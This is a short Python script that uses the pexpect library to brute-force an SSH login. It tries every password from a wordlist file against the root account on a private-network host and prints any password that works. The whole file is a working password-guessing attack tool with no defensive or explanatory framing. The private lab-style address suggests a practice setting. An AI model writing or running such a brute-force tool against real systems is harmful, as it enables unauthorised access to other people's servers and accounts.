from pexpect import pxssh

def Login(server, un, pw):
    try:
        s = pxssh.pxssh()
        s.login(server, un, pw)
        return 1

    except:
        return 0

def main():
    flags = 0
    server = "192.168.159.129"
    un = "root"


    dir = "dic.txt"
    with open(dir, "r") as f:
        for line in f:
            if Login(server, un, line):
                flags = 1
                print('passwd is %s'%(line))
                break
    if flags == 0:
        print("[-] Login Failed")
    else:
        print("[+] Login Succeeded")

    pass

if __name__ == '__main__':
    main()
